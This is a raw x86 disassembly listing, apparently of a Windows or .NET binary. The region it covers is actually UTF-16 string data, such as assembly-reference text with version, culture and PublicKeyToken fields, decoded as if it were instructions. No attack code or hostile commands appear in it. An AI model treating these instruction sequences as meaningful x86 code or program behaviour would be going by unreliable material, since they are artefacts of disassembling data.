  40ca86:	add    BYTE PTR gs:0x65006e00,bh
  40ca8d:	add    BYTE PTR [ebp+0x0],dh
  40ca90:	je     0x40ca92
  40ca92:	jb     0x40ca94
  40ca94:	popa   
  40ca95:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40ca99:	add    BYTE PTR [eax],ah
  40ca9b:	add    BYTE PTR [eax+0x0],dl
  40ca9e:	jne    0x40caa0
  40caa0:	bound  eax,QWORD PTR [eax]
  40caa2:	ins    BYTE PTR es:[edi],dx
  40caa3:	add    BYTE PTR [ecx+0x0],ch
  40caa6:	arpl   WORD PTR [eax],ax
  40caa8:	dec    ebx
  40caa9:	add    BYTE PTR [ebp+0x0],ah
  40caac:	jns    0x40caae
  40caae:	push   esp
  40caaf:	add    BYTE PTR [edi+0x0],ch
  40cab2:	imul   eax,DWORD PTR [eax],0x65
  40cab5:	add    BYTE PTR [esi+0x0],ch
  40cab8:	cmp    eax,0x30006200
  40cabd:	add    BYTE PTR [ebx],dh
  40cabf:	add    BYTE PTR [esi+0x0],ah
  40cac2:	xor    eax,0x37006600
  40cac7:	add    BYTE PTR [esi+0x0],ah
  40caca:	xor    DWORD PTR [eax],eax
  40cacc:	xor    DWORD PTR [eax],eax
  40cace:	add    BYTE PTR fs:0x61003000,dh
  40cad5:	add    BYTE PTR [ebx],dh
  40cad7:	add    BYTE PTR [ecx+0x0],ah
  40cada:	and    BYTE PTR [edx+0x0],ah
  40cadd:	aaa    
  40cade:	add    BYTE PTR [edx+0x0],ah
  40cae1:	add    BYTE PTR fs:[edi],dh
  40cae4:	add    BYTE PTR [esi],dh
  40cae6:	add    BYTE PTR [edi],dh
  40cae8:	add    BYTE PTR [eax],bh
  40caea:	add    BYTE PTR [edx+0x0],ah
  40caed:	cmp    DWORD PTR [eax],eax
  40caef:	aaa    
  40caf0:	add    BYTE PTR [edi],dh
  40caf2:	add    BYTE PTR [edx+0x0],ah
  40caf5:	add    BYTE PTR fs:[eax],bh
  40caf8:	add    BYTE PTR [esi+0x0],ah
  40cafb:	xor    BYTE PTR [edx+0x530041],0x50
  40cb02:	add    BYTE PTR [esi],ch
  40cb04:	add    BYTE PTR [edx+0x0],al
  40cb07:	jb     0x40cb09
  40cb09:	outs   dx,DWORD PTR ds:[esi]
  40cb0a:	add    BYTE PTR [edi+0x0],dh
  40cb0d:	jae    0x40cb0f
  40cb0f:	add    BYTE PTR gs:[edx+0x0],dh
  40cb13:	inc    ebx
  40cb14:	add    BYTE PTR [ecx+0x0],ah
  40cb17:	jo     0x40cb19
  40cb19:	jae    0x40cb1b
  40cb1b:	inc    esi
  40cb1c:	add    BYTE PTR [ecx+0x0],ah
  40cb1f:	arpl   WORD PTR [eax],ax
  40cb21:	je     0x40cb23
  40cb23:	outs   dx,DWORD PTR ds:[esi]
  40cb24:	add    BYTE PTR [edx+0x0],dh
  40cb27:	jns    0x40cb29
  40cb29:	sub    al,0x0
  40cb2b:	and    BYTE PTR [eax],al
  40cb2d:	push   esi
  40cb2e:	add    BYTE PTR [ebp+0x0],ah
  40cb31:	jb     0x40cb33
  40cb33:	jae    0x40cb35
  40cb35:	imul   eax,DWORD PTR [eax],0x6e006f
  40cb3b:	cmp    eax,0x2e003200
  40cb40:	add    BYTE PTR [eax],dh
  40cb42:	add    BYTE PTR [esi],ch
  40cb44:	add    BYTE PTR [eax],dh
  40cb46:	add    BYTE PTR [esi],ch
  40cb48:	add    BYTE PTR [eax],dh
  40cb4a:	add    BYTE PTR [eax+eax*1],ch
  40cb4d:	and    BYTE PTR [eax],al
  40cb4f:	inc    ebx
  40cb50:	add    BYTE PTR [ebp+0x0],dh
  40cb53:	ins    BYTE PTR es:[edi],dx
  40cb54:	add    BYTE PTR [eax+eax*1+0x75],dh
  40cb58:	add    BYTE PTR [edx+0x0],dh
  40cb5b:	add    BYTE PTR gs:0x65006e00,bh
  40cb62:	add    BYTE PTR [ebp+0x0],dh
  40cb65:	je     0x40cb67
  40cb67:	jb     0x40cb69
  40cb69:	popa   
  40cb6a:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40cb6e:	add    BYTE PTR [eax],ah
  40cb70:	add    BYTE PTR [eax+0x0],dl
  40cb73:	jne    0x40cb75
  40cb75:	bound  eax,QWORD PTR [eax]
  40cb77:	ins    BYTE PTR es:[edi],dx
  40cb78:	add    BYTE PTR [ecx+0x0],ch
  40cb7b:	arpl   WORD PTR [eax],ax
  40cb7d:	dec    ebx
  40cb7e:	add    BYTE PTR [ebp+0x0],ah
  40cb81:	jns    0x40cb83
  40cb83:	push   esp
  40cb84:	add    BYTE PTR [edi+0x0],ch
  40cb87:	imul   eax,DWORD PTR [eax],0x65
  40cb8a:	add    BYTE PTR [esi+0x0],ch
  40cb8d:	cmp    eax,0x37006200
  40cb92:	add    BYTE PTR [edx+0x0],ah
  40cb95:	add    BYTE PTR fs:[edi],dh
  40cb98:	add    BYTE PTR [esi],dh
  40cb9a:	add    BYTE PTR [edi],dh
  40cb9c:	add    BYTE PTR [eax],bh
  40cb9e:	add    BYTE PTR [edx+0x0],ah
  40cba1:	cmp    DWORD PTR [eax],eax
  40cba3:	aaa    
  40cba4:	add    BYTE PTR [edi],dh
  40cba6:	add    BYTE PTR [edx+0x0],ah
  40cba9:	add    BYTE PTR fs:[eax],bh
  40cbac:	add    BYTE PTR [esi+0x0],ah
  40cbaf:	sub    BYTE PTR [esi+0x69004d],0x63
  40cbb6:	add    BYTE PTR [edx+0x0],dh
  40cbb9:	outs   dx,DWORD PTR ds:[esi]
  40cbba:	add    BYTE PTR [ebx+0x0],dh
  40cbbd:	outs   dx,DWORD PTR ds:[esi]
  40cbbe:	add    BYTE PTR [esi+0x0],ah
  40cbc1:	je     0x40cbc3
  40cbc3:	add    BYTE PTR cs:[esi+0x0],dl
  40cbc7:	push   ebx
  40cbc8:	add    BYTE PTR [eax+eax*1+0x65],al
  40cbcc:	add    BYTE PTR [ebx+0x0],dh
  40cbcf:	imul   eax,DWORD PTR [eax],0x6e0067
  40cbd5:	add    BYTE PTR gs:[edx+0x0],dh
  40cbd9:	sub    al,0x0
  40cbdb:	and    BYTE PTR [eax],al
  40cbdd:	push   esi
  40cbde:	add    BYTE PTR [ebp+0x0],ah
  40cbe1:	jb     0x40cbe3
  40cbe3:	jae    0x40cbe5
  40cbe5:	imul   eax,DWORD PTR [eax],0x6e006f
  40cbeb:	cmp    eax,0x2e003900
  40cbf0:	add    BYTE PTR [eax],dh
  40cbf2:	add    BYTE PTR [esi],ch
  40cbf4:	add    BYTE PTR [eax],dh
  40cbf6:	add    BYTE PTR [esi],ch
  40cbf8:	add    BYTE PTR [eax],dh
  40cbfa:	add    BYTE PTR [eax+eax*1],ch
  40cbfd:	and    BYTE PTR [eax],al
  40cbff:	inc    ebx
  40cc00:	add    BYTE PTR [ebp+0x0],dh
  40cc03:	ins    BYTE PTR es:[edi],dx
  40cc04:	add    BYTE PTR [eax+eax*1+0x75],dh
  40cc08:	add    BYTE PTR [edx+0x0],dh
  40cc0b:	add    BYTE PTR gs:0x65006e00,bh
  40cc12:	add    BYTE PTR [ebp+0x0],dh
  40cc15:	je     0x40cc17
  40cc17:	jb     0x40cc19
  40cc19:	popa   
  40cc1a:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40cc1e:	add    BYTE PTR [eax],ah
  40cc20:	add    BYTE PTR [eax+0x0],dl
  40cc23:	jne    0x40cc25
  40cc25:	bound  eax,QWORD PTR [eax]
  40cc27:	ins    BYTE PTR es:[edi],dx
  40cc28:	add    BYTE PTR [ecx+0x0],ch
  40cc2b:	arpl   WORD PTR [eax],ax
  40cc2d:	dec    ebx
  40cc2e:	add    BYTE PTR [ebp+0x0],ah
  40cc31:	jns    0x40cc33
  40cc33:	push   esp
  40cc34:	add    BYTE PTR [edi+0x0],ch
  40cc37:	imul   eax,DWORD PTR [eax],0x65
  40cc3a:	add    BYTE PTR [esi+0x0],ch
  40cc3d:	cmp    eax,0x30006200
  40cc42:	add    BYTE PTR [ebx],dh
  40cc44:	add    BYTE PTR [esi+0x0],ah
  40cc47:	xor    eax,0x37006600
  40cc4c:	add    BYTE PTR [esi+0x0],ah
  40cc4f:	xor    DWORD PTR [eax],eax
  40cc51:	xor    DWORD PTR [eax],eax
  40cc53:	add    BYTE PTR fs:0x61003000,dh
  40cc5a:	add    BYTE PTR [ebx],dh
  40cc5c:	add    BYTE PTR [ecx+0x0],ah
  40cc5f:	cmp    BYTE PTR [edx+0x69004d],0x63
  40cc66:	add    BYTE PTR [edx+0x0],dh
  40cc69:	outs   dx,DWORD PTR ds:[esi]
  40cc6a:	add    BYTE PTR [ebx+0x0],dh
  40cc6d:	outs   dx,DWORD PTR ds:[esi]
  40cc6e:	add    BYTE PTR [esi+0x0],ah
  40cc71:	je     0x40cc73
  40cc73:	add    BYTE PTR cs:[esi+0x0],dl
  40cc77:	imul   eax,DWORD PTR [eax],0x750073
  40cc7d:	popa   
  40cc7e:	add    BYTE PTR [eax+eax*1+0x53],ch
  40cc82:	add    BYTE PTR [eax+eax*1+0x75],dh
  40cc86:	add    BYTE PTR [eax+eax*1+0x69],ah
  40cc8a:	add    BYTE PTR [edi+0x0],ch
  40cc8d:	add    BYTE PTR cs:[edi+0x0],dl
  40cc91:	add    BYTE PTR gs:[edx+0x0],ah
  40cc95:	sub    al,0x0
  40cc97:	and    BYTE PTR [eax],al
  40cc99:	push   esi
  40cc9a:	add    BYTE PTR [ebp+0x0],ah
  40cc9d:	jb     0x40cc9f
  40cc9f:	jae    0x40cca1
  40cca1:	imul   eax,DWORD PTR [eax],0x6e006f
  40cca7:	cmp    eax,0x2e003900
  40ccac:	add    BYTE PTR [eax],dh
  40ccae:	add    BYTE PTR [esi],ch
  40ccb0:	add    BYTE PTR [eax],dh
  40ccb2:	add    BYTE PTR [esi],ch
  40ccb4:	add    BYTE PTR [eax],dh
  40ccb6:	add    BYTE PTR [eax+eax*1],ch
  40ccb9:	and    BYTE PTR [eax],al
  40ccbb:	inc    ebx
  40ccbc:	add    BYTE PTR [ebp+0x0],dh
  40ccbf:	ins    BYTE PTR es:[edi],dx
  40ccc0:	add    BYTE PTR [eax+eax*1+0x75],dh
  40ccc4:	add    BYTE PTR [edx+0x0],dh
  40ccc7:	add    BYTE PTR gs:0x65006e00,bh
  40ccce:	add    BYTE PTR [ebp+0x0],dh
  40ccd1:	je     0x40ccd3
  40ccd3:	jb     0x40ccd5
  40ccd5:	popa   
  40ccd6:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40ccda:	add    BYTE PTR [eax],ah
  40ccdc:	add    BYTE PTR [eax+0x0],dl
  40ccdf:	jne    0x40cce1
  40cce1:	bound  eax,QWORD PTR [eax]
  40cce3:	ins    BYTE PTR es:[edi],dx
  40cce4:	add    BYTE PTR [ecx+0x0],ch
  40cce7:	arpl   WORD PTR [eax],ax
  40cce9:	dec    ebx
  40ccea:	add    BYTE PTR [ebp+0x0],ah
  40cced:	jns    0x40ccef
  40ccef:	push   esp
  40ccf0:	add    BYTE PTR [edi+0x0],ch
  40ccf3:	imul   eax,DWORD PTR [eax],0x65
  40ccf6:	add    BYTE PTR [esi+0x0],ch
  40ccf9:	cmp    eax,0x30006200
  40ccfe:	add    BYTE PTR [ebx],dh
  40cd00:	add    BYTE PTR [esi+0x0],ah
  40cd03:	xor    eax,0x37006600
  40cd08:	add    BYTE PTR [esi+0x0],ah
  40cd0b:	xor    DWORD PTR [eax],eax
  40cd0d:	xor    DWORD PTR [eax],eax
  40cd0f:	add    BYTE PTR fs:0x61003000,dh
  40cd16:	add    BYTE PTR [ebx],dh
  40cd18:	add    BYTE PTR [ecx+0x0],ah
  40cd1b:	cmp    BYTE PTR [ebp+ecx*2+0x63006900],0x0
  40cd23:	jb     0x40cd25
  40cd25:	outs   dx,DWORD PTR ds:[esi]
  40cd26:	add    BYTE PTR [ebx+0x0],dh
  40cd29:	outs   dx,DWORD PTR ds:[esi]
  40cd2a:	add    BYTE PTR [esi+0x0],ah
  40cd2d:	je     0x40cd2f
  40cd2f:	add    BYTE PTR cs:[edi+0x0],dl
  40cd33:	add    BYTE PTR gs:[edx+0x0],ah
  40cd37:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  40cd3c:	add    BYTE PTR [ebx+0x0],dh
  40cd3f:	imul   eax,DWORD PTR [eax],0x6e0067
  40cd45:	add    BYTE PTR cs:[ebx+0x0],al
  40cd49:	ins    BYTE PTR es:[edi],dx
  40cd4a:	add    BYTE PTR [ecx+0x0],ch
  40cd4d:	add    BYTE PTR gs:[esi+0x0],ch
  40cd51:	je     0x40cd53
  40cd53:	sub    al,0x0
  40cd55:	and    BYTE PTR [eax],al
  40cd57:	push   esi
  40cd58:	add    BYTE PTR [ebp+0x0],ah
  40cd5b:	jb     0x40cd5d
  40cd5d:	jae    0x40cd5f
  40cd5f:	imul   eax,DWORD PTR [eax],0x6e006f
  40cd65:	cmp    eax,0x2e003900
  40cd6a:	add    BYTE PTR [eax],dh
  40cd6c:	add    BYTE PTR [esi],ch
  40cd6e:	add    BYTE PTR [eax],dh
  40cd70:	add    BYTE PTR [esi],ch
  40cd72:	add    BYTE PTR [eax],dh
  40cd74:	add    BYTE PTR [eax+eax*1],ch
  40cd77:	and    BYTE PTR [eax],al
  40cd79:	inc    ebx
  40cd7a:	add    BYTE PTR [ebp+0x0],dh
  40cd7d:	ins    BYTE PTR es:[edi],dx
  40cd7e:	add    BYTE PTR [eax+eax*1+0x75],dh
  40cd82:	add    BYTE PTR [edx+0x0],dh
  40cd85:	add    BYTE PTR gs:0x65006e00,bh
  40cd8c:	add    BYTE PTR [ebp+0x0],dh
  40cd8f:	je     0x40cd91
  40cd91:	jb     0x40cd93
  40cd93:	popa   
  40cd94:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40cd98:	add    BYTE PTR [eax],ah
  40cd9a:	add    BYTE PTR [eax+0x0],dl
  40cd9d:	jne    0x40cd9f
  40cd9f:	bound  eax,QWORD PTR [eax]
  40cda1:	ins    BYTE PTR es:[edi],dx
  40cda2:	add    BYTE PTR [ecx+0x0],ch
  40cda5:	arpl   WORD PTR [eax],ax
  40cda7:	dec    ebx
  40cda8:	add    BYTE PTR [ebp+0x0],ah
  40cdab:	jns    0x40cdad
  40cdad:	push   esp
  40cdae:	add    BYTE PTR [edi+0x0],ch
  40cdb1:	imul   eax,DWORD PTR [eax],0x65
  40cdb4:	add    BYTE PTR [esi+0x0],ch
  40cdb7:	cmp    eax,0x30006200
  40cdbc:	add    BYTE PTR [ebx],dh
  40cdbe:	add    BYTE PTR [esi+0x0],ah
  40cdc1:	xor    eax,0x37006600
  40cdc6:	add    BYTE PTR [esi+0x0],ah
  40cdc9:	xor    DWORD PTR [eax],eax
  40cdcb:	xor    DWORD PTR [eax],eax
  40cdcd:	add    BYTE PTR fs:0x61003000,dh
  40cdd4:	add    BYTE PTR [ebx],dh
  40cdd6:	add    BYTE PTR [ecx+0x0],ah
  40cdd9:	cmp    BYTE PTR [ebp+ecx*2+0x63006900],0x0
  40cde1:	jb     0x40cde3
  40cde3:	outs   dx,DWORD PTR ds:[esi]
  40cde4:	add    BYTE PTR [ebx+0x0],dh
  40cde7:	outs   dx,DWORD PTR ds:[esi]
  40cde8:	add    BYTE PTR [esi+0x0],ah
  40cdeb:	je     0x40cded
  40cded:	add    BYTE PTR cs:[esi+0x0],dl
  40cdf1:	push   ebx
  40cdf2:	add    BYTE PTR [eax+eax*1+0x65],al
  40cdf6:	add    BYTE PTR [ebx+0x0],dh
  40cdf9:	imul   eax,DWORD PTR [eax],0x6e0067
  40cdff:	add    BYTE PTR gs:[edx+0x0],dh
  40ce03:	add    BYTE PTR cs:[ebp+0x0],cl
  40ce07:	outs   dx,DWORD PTR ds:[esi]
  40ce08:	add    BYTE PTR [edx+0x0],ah
  40ce0b:	imul   eax,DWORD PTR [eax],0x65006c
  40ce11:	sub    al,0x0
  40ce13:	and    BYTE PTR [eax],al
  40ce15:	push   esi
  40ce16:	add    BYTE PTR [ebp+0x0],ah
  40ce19:	jb     0x40ce1b
  40ce1b:	jae    0x40ce1d
  40ce1d:	imul   eax,DWORD PTR [eax],0x6e006f
  40ce23:	cmp    eax,0x2e003800
  40ce28:	add    BYTE PTR [eax],dh
  40ce2a:	add    BYTE PTR [esi],ch
  40ce2c:	add    BYTE PTR [eax],dh
  40ce2e:	add    BYTE PTR [esi],ch
  40ce30:	add    BYTE PTR [eax],dh
  40ce32:	add    BYTE PTR [eax+eax*1],ch
  40ce35:	and    BYTE PTR [eax],al
  40ce37:	inc    ebx
  40ce38:	add    BYTE PTR [ebp+0x0],dh
  40ce3b:	ins    BYTE PTR es:[edi],dx
  40ce3c:	add    BYTE PTR [eax+eax*1+0x75],dh
  40ce40:	add    BYTE PTR [edx+0x0],dh
  40ce43:	add    BYTE PTR gs:0x65006e00,bh
  40ce4a:	add    BYTE PTR [ebp+0x0],dh
  40ce4d:	je     0x40ce4f
  40ce4f:	jb     0x40ce51
  40ce51:	popa   
  40ce52:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40ce56:	add    BYTE PTR [eax],ah
  40ce58:	add    BYTE PTR [eax+0x0],dl
  40ce5b:	jne    0x40ce5d
  40ce5d:	bound  eax,QWORD PTR [eax]
  40ce5f:	ins    BYTE PTR es:[edi],dx
  40ce60:	add    BYTE PTR [ecx+0x0],ch
  40ce63:	arpl   WORD PTR [eax],ax
  40ce65:	dec    ebx
  40ce66:	add    BYTE PTR [ebp+0x0],ah
  40ce69:	jns    0x40ce6b
  40ce6b:	push   esp
  40ce6c:	add    BYTE PTR [edi+0x0],ch
  40ce6f:	imul   eax,DWORD PTR [eax],0x65
  40ce72:	add    BYTE PTR [esi+0x0],ch
  40ce75:	cmp    eax,0x30006200
  40ce7a:	add    BYTE PTR [ebx],dh
  40ce7c:	add    BYTE PTR [esi+0x0],ah
  40ce7f:	xor    eax,0x37006600
  40ce84:	add    BYTE PTR [esi+0x0],ah
  40ce87:	xor    DWORD PTR [eax],eax
  40ce89:	xor    DWORD PTR [eax],eax
  40ce8b:	add    BYTE PTR fs:0x61003000,dh
  40ce92:	add    BYTE PTR [ebx],dh
  40ce94:	add    BYTE PTR [ecx+0x0],ah
  40ce97:	sub    BYTE PTR [eax+0x69004d],0x63
  40ce9e:	add    BYTE PTR [edx+0x0],dh
  40cea1:	outs   dx,DWORD PTR ds:[esi]
  40cea2:	add    BYTE PTR [ebx+0x0],dh
  40cea5:	outs   dx,DWORD PTR ds:[esi]
  40cea6:	add    BYTE PTR [esi+0x0],ah
  40cea9:	je     0x40ceab
  40ceab:	add    BYTE PTR cs:[edx+0x0],cl
  40ceaf:	push   ebx
  40ceb0:	add    BYTE PTR [ebx+0x0],ah
  40ceb3:	jb     0x40ceb5
  40ceb5:	imul   eax,DWORD PTR [eax],0x740070
  40cebb:	sub    al,0x0
  40cebd:	and    BYTE PTR [eax],al
  40cebf:	push   esi
  40cec0:	add    BYTE PTR [ebp+0x0],ah
  40cec3:	jb     0x40cec5
  40cec5:	jae    0x40cec7
  40cec7:	imul   eax,DWORD PTR [eax],0x6e006f
  40cecd:	cmp    eax,0x2e003800
  40ced2:	add    BYTE PTR [eax],dh
  40ced4:	add    BYTE PTR [esi],ch
  40ced6:	add    BYTE PTR [eax],dh
  40ced8:	add    BYTE PTR [esi],ch
  40ceda:	add    BYTE PTR [eax],dh
  40cedc:	add    BYTE PTR [eax+eax*1],ch
  40cedf:	and    BYTE PTR [eax],al
  40cee1:	inc    ebx
  40cee2:	add    BYTE PTR [ebp+0x0],dh
  40cee5:	ins    BYTE PTR es:[edi],dx
  40cee6:	add    BYTE PTR [eax+eax*1+0x75],dh
  40ceea:	add    BYTE PTR [edx+0x0],dh
  40ceed:	add    BYTE PTR gs:0x65006e00,bh
  40cef4:	add    BYTE PTR [ebp+0x0],dh
  40cef7:	je     0x40cef9
  40cef9:	jb     0x40cefb
  40cefb:	popa   
  40cefc:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40cf00:	add    BYTE PTR [eax],ah
  40cf02:	add    BYTE PTR [eax+0x0],dl
  40cf05:	jne    0x40cf07
  40cf07:	bound  eax,QWORD PTR [eax]
  40cf09:	ins    BYTE PTR es:[edi],dx
  40cf0a:	add    BYTE PTR [ecx+0x0],ch
  40cf0d:	arpl   WORD PTR [eax],ax
  40cf0f:	dec    ebx
  40cf10:	add    BYTE PTR [ebp+0x0],ah
  40cf13:	jns    0x40cf15
  40cf15:	push   esp
  40cf16:	add    BYTE PTR [edi+0x0],ch
  40cf19:	imul   eax,DWORD PTR [eax],0x65
  40cf1c:	add    BYTE PTR [esi+0x0],ch
  40cf1f:	cmp    eax,0x30006200
  40cf24:	add    BYTE PTR [ebx],dh
  40cf26:	add    BYTE PTR [esi+0x0],ah
  40cf29:	xor    eax,0x37006600
  40cf2e:	add    BYTE PTR [esi+0x0],ah
  40cf31:	xor    DWORD PTR [eax],eax
  40cf33:	xor    DWORD PTR [eax],eax
  40cf35:	add    BYTE PTR fs:0x61003000,dh
  40cf3c:	add    BYTE PTR [ebx],dh
  40cf3e:	add    BYTE PTR [ecx+0x0],ah
  40cf41:	push   ds
  40cf42:	inc    ecx
  40cf43:	add    BYTE PTR [eax+0x0],dh
  40cf46:	jo     0x40cf48
  40cf48:	ins    BYTE PTR es:[edi],dx
  40cf49:	add    BYTE PTR [ecx+0x0],ch
  40cf4c:	arpl   WORD PTR [eax],ax
  40cf4e:	popa   
  40cf4f:	add    BYTE PTR [eax+eax*1+0x69],dh
  40cf53:	add    BYTE PTR [edi+0x0],ch
  40cf56:	outs   dx,BYTE PTR ds:[esi]
  40cf57:	add    BYTE PTR [eax+eax*1+0x6f],cl
  40cf5b:	add    BYTE PTR [edi+0x0],ah
  40cf5e:	outs   dx,DWORD PTR ds:[esi]
  40cf5f:	add    BYTE PTR [edx*2+0x61007300],dl
  40cf66:	add    BYTE PTR [edi+0x0],ah
  40cf69:	add    BYTE PTR gs:[eax+eax*1+0x69],dl
  40cf6e:	add    BYTE PTR [eax+eax*1+0x6c],dh
  40cf72:	add    BYTE PTR [ebp+0x0],ah
  40cf75:	sub    al,0x57
  40cf77:	add    BYTE PTR [edx+0x0],dh
  40cf7a:	imul   eax,DWORD PTR [eax],0x690074
  40cf80:	outs   dx,BYTE PTR ds:[esi]
  40cf81:	add    BYTE PTR [edi+0x0],ah
  40cf84:	dec    edi
  40cf85:	add    BYTE PTR [edx+0x0],ah
  40cf88:	push   0x0
  40cf8a:	add    BYTE PTR gs:[ebx+0x0],ah
  40cf8e:	je     0x40cf90
  40cf90:	dec    esp
  40cf91:	add    BYTE PTR [ecx+0x0],ah
  40cf94:	jns    0x40cf96
  40cf96:	add    BYTE PTR gs:[edx+0x0],dh
  40cf9a:	inc    esi
  40cf9b:	add    BYTE PTR [ecx+0x0],ch
  40cf9e:	ins    BYTE PTR es:[edi],dx
  40cf9f:	add    BYTE PTR [ebp+0x0],ah
  40cfa2:	and    al,0x47
  40cfa4:	add    BYTE PTR [ebp+0x0],ah
  40cfa7:	outs   dx,BYTE PTR ds:[esi]
  40cfa8:	add    BYTE PTR [ebp+0x0],ah
  40cfab:	jb     0x40cfad
  40cfad:	popa   
  40cfae:	add    BYTE PTR [eax+eax*1+0x69],dh
  40cfb2:	add    BYTE PTR [edi+0x0],ch
  40cfb5:	outs   dx,BYTE PTR ds:[esi]
  40cfb6:	add    BYTE PTR [ebx+0x0],al
  40cfb9:	outs   dx,DWORD PTR ds:[esi]
  40cfba:	add    BYTE PTR [ebp+0x0],ch
  40cfbd:	jo     0x40cfbf
  40cfbf:	ins    BYTE PTR es:[edi],dx
  40cfc0:	add    BYTE PTR [ebp+0x0],ah
  40cfc3:	je     0x40cfc5
  40cfc5:	add    BYTE PTR gs:[edx],ch
  40cfc8:	push   ebp
  40cfc9:	add    BYTE PTR [ebx+0x0],dh
  40cfcc:	popa   
  40cfcd:	add    BYTE PTR [edi+0x0],ah
  40cfd0:	add    BYTE PTR gs:[esi+0x0],cl
  40cfd4:	popa   
  40cfd5:	add    BYTE PTR [ebp+0x0],ch
  40cfd8:	add    BYTE PTR gs:[ecx+0x0],al
  40cfdc:	outs   dx,BYTE PTR ds:[esi]
  40cfdd:	add    BYTE PTR [eax+eax*1+0x56],ah
  40cfe1:	add    BYTE PTR [ecx+0x0],ah
  40cfe4:	ins    BYTE PTR es:[edi],dx
  40cfe5:	add    BYTE PTR [ebp+0x0],dh
  40cfe8:	add    BYTE PTR gs:[esi+0x0],cl
  40cfec:	popa   
  40cfed:	add    BYTE PTR [ebp+0x0],ch
  40cff0:	add    BYTE PTR gs:[eax],ah
  40cff3:	push   ebp
  40cff4:	add    BYTE PTR [ebx+0x0],dh
  40cff7:	popa   
  40cff8:	add    BYTE PTR [edi+0x0],ah
  40cffb:	add    BYTE PTR gs:[esi+0x0],cl
  40cfff:	popa   
  40d000:	add    BYTE PTR [ebp+0x0],ch
  40d003:	add    BYTE PTR gs:[ecx+0x0],al
  40d007:	outs   dx,BYTE PTR ds:[esi]
  40d008:	add    BYTE PTR [eax+eax*1+0x45],ah
  40d00c:	add    BYTE PTR [esi+0x0],ch
  40d00f:	jne    0x40d011
  40d011:	ins    DWORD PTR es:[edi],dx
  40d012:	add    BYTE PTR [eax],bh
  40d014:	push   ebp
  40d015:	add    BYTE PTR [ebx+0x0],dh
  40d018:	popa   
  40d019:	add    BYTE PTR [edi+0x0],ah
  40d01c:	add    BYTE PTR gs:[eax+eax*1+0x65],al
  40d021:	add    BYTE PTR [ebx+0x0],dh
  40d024:	arpl   WORD PTR [eax],ax
  40d026:	jb     0x40d028
  40d028:	imul   eax,DWORD PTR [eax],0x740070
  40d02e:	imul   eax,DWORD PTR [eax],0x6e006f
  40d034:	inc    ecx
  40d035:	add    BYTE PTR [esi+0x0],ch
  40d038:	add    BYTE PTR fs:[ebx+0x0],dl
  40d03c:	push   0x72006f00
  40d041:	add    BYTE PTR [eax+eax*1+0x46],dh
  40d045:	add    BYTE PTR [edi+0x0],ch
  40d048:	jb     0x40d04a
  40d04a:	ins    DWORD PTR es:[edi],dx
  40d04b:	add    BYTE PTR [esi],ah
  40d04d:	push   ebp
  40d04e:	add    BYTE PTR [ebx+0x0],dh
  40d051:	popa   
  40d052:	add    BYTE PTR [edi+0x0],ah
  40d055:	add    BYTE PTR gs:[ebp+0x0],dl
  40d059:	jb     0x40d05b
  40d05b:	imul   eax,DWORD PTR [eax],0x650044
  40d061:	jae    0x40d063
  40d063:	arpl   WORD PTR [eax],ax
  40d065:	jb     0x40d067
  40d067:	imul   eax,DWORD PTR [eax],0x740070
  40d06d:	imul   eax,DWORD PTR [eax],0x6e006f
  40d073:	sub    BYTE PTR [ebp+0x0],dl
  40d076:	jae    0x40d078
  40d078:	popa   
  40d079:	add    BYTE PTR [edi+0x0],ah
  40d07c:	add    BYTE PTR gs:[eax+0x0],cl
  40d080:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  40d085:	add    BYTE PTR [eax+eax*1+0x65],al
  40d089:	add    BYTE PTR [ebx+0x0],dh
  40d08c:	arpl   WORD PTR [eax],ax
  40d08e:	jb     0x40d090
  40d090:	imul   eax,DWORD PTR [eax],0x740070
  40d096:	imul   eax,DWORD PTR [eax],0x6e006f
  40d09c:	sub    al,0x55
  40d09e:	add    BYTE PTR [ebx+0x0],dh
  40d0a1:	popa   
  40d0a2:	add    BYTE PTR [edi+0x0],ah
  40d0a5:	add    BYTE PTR gs:[ecx+0x0],cl
  40d0a9:	outs   dx,BYTE PTR ds:[esi]
  40d0aa:	add    BYTE PTR [ebx+0x0],al
  40d0ad:	jae    0x40d0af
  40d0af:	add    BYTE PTR fs:[eax+eax*1+0x44],ch
  40d0b4:	add    BYTE PTR [ebp+0x0],ah
  40d0b7:	jae    0x40d0b9
  40d0b9:	arpl   WORD PTR [eax],ax
  40d0bb:	jb     0x40d0bd
  40d0bd:	imul   eax,DWORD PTR [eax],0x740070
  40d0c3:	imul   eax,DWORD PTR [eax],0x6e006f
  40d0c9:	cmp    al,0x55
  40d0cb:	add    BYTE PTR [ebx+0x0],dh
  40d0ce:	popa   
  40d0cf:	add    BYTE PTR [edi+0x0],ah
  40d0d2:	add    BYTE PTR gs:[edi+0x0],cl
  40d0d6:	jne    0x40d0d8
  40d0d8:	je     0x40d0da
  40d0da:	dec    edi
  40d0db:	add    BYTE PTR [edx+0x0],ah
  40d0de:	push   0x0
  40d0e0:	add    BYTE PTR gs:[ebx+0x0],ah
  40d0e4:	je     0x40d0e6
  40d0e6:	dec    esp
  40d0e7:	add    BYTE PTR [ecx+0x0],ah
  40d0ea:	jns    0x40d0ec
  40d0ec:	add    BYTE PTR gs:[edx+0x0],dh
  40d0f0:	inc    esp
  40d0f1:	add    BYTE PTR [ebp+0x0],ah
  40d0f4:	jae    0x40d0f6
  40d0f6:	arpl   WORD PTR [eax],ax
  40d0f8:	jb     0x40d0fa
  40d0fa:	imul   eax,DWORD PTR [eax],0x740070
  40d100:	imul   eax,DWORD PTR [eax],0x6e006f
  40d106:	cmp    al,0x55
  40d108:	add    BYTE PTR [ebx+0x0],dh
  40d10b:	popa   
  40d10c:	add    BYTE PTR [edi+0x0],ah
  40d10f:	add    BYTE PTR gs:[eax+eax*1+0x61],cl
  40d114:	add    BYTE PTR [esi+0x0],ch
  40d117:	add    BYTE PTR [di+0x0],dh
  40d11b:	popa   
  40d11c:	add    BYTE PTR [edi+0x0],ah
  40d11f:	add    BYTE PTR gs:[ebx+0x0],al
  40d123:	push   ebx
  40d124:	add    BYTE PTR [eax+0x0],ch
  40d127:	popa   
  40d128:	add    BYTE PTR [edx+0x0],dh
  40d12b:	jo     0x40d12d
  40d12d:	inc    esp
